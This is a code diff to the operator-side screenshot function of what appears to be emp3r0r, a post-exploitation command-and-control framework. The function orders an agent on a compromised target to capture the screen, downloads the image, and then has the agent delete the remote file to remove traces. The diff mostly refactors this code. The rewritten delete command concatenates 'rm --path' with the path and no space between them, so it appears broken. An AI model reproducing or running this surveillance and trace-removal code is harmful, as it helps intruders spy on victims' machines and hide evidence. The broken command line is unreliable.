@@ -3,7 +3,6 @@
 
 package cc
 
-
 import (
 	"fmt"
 	"os"
@@ -14,16 +13,15 @@ import (
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
-	"github.com/mholt/archiver/v3"
 )
 
 // TakeScreenshot take a screenshot of selected target, and download it
 // open the picture if possible
 func TakeScreenshot() {
 	// tell agent to take screenshot
-	err := SendCmdToCurrentTarget("screenshot", "")
-	if err != nil {
-		CliPrintError("send screenshot cmd: %v", err)
+	screenshotErr := SendCmdToCurrentTarget("screenshot", "")
+	if screenshotErr != nil {
+		CliPrintError("send screenshot cmd: %v", screenshotErr)
 		return
 	}
 
@@ -32,7 +30,7 @@ func TakeScreenshot() {
 
 func processScreenshot(out string, target *emp3r0r_data.AgentSystemInfo) (err error) {
 	if strings.Contains(out, "Error") {
-		return fmt.Errorf(out)
+		return fmt.Errorf("%s", out)
 	}
 	CliPrintInfo("We will get %s screenshot file for you, wait", strconv.Quote(out))
 	err = GetFile(out, target)
@@ -67,7 +65,7 @@ func processScreenshot(out string, target *emp3r0r_data.AgentSystemInfo) (err er
 
 	// unzip if it's zip
 	if strings.HasSuffix(path, ".zip") {
-		err = archiver.Unarchive(FileGetDir+path, FileGetDir)
+		err = util.Unarchive(FileGetDir+path, FileGetDir)
 		if err != nil {
 			return fmt.Errorf("Unarchive screenshot zip: %v", err)
 		}
@@ -88,7 +86,7 @@ func processScreenshot(out string, target *emp3r0r_data.AgentSystemInfo) (err er
 	}
 
 	// tell agent to delete the remote file
-	err = SendCmd("rm "+out, "", target)
+	err = SendCmd("rm --path"+out, "", target)
 	if err != nil {
 		CliPrintWarning("Failed to delete remote file %s: %v", strconv.Quote(out), err)
 	}
